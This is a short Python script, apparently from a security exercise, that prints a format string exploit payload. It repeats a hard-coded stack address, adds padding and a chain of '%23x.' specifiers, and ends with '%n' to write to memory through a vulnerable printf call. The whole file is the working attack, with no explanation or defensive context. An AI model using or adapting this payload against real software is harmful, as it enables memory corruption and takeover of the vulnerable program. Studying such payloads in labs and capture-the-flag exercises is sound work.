import sys

inserts = 15

for i in range(0,inserts):
    sys.stdout.write('\x2c\xd6\xff\xff')
sys.stdout.write('_' * 8)
#sys.stdout.write('a'*20)
for i in range(0,3+inserts):
    sys.stdout.write('%23x.')
sys.stdout.write('%n')
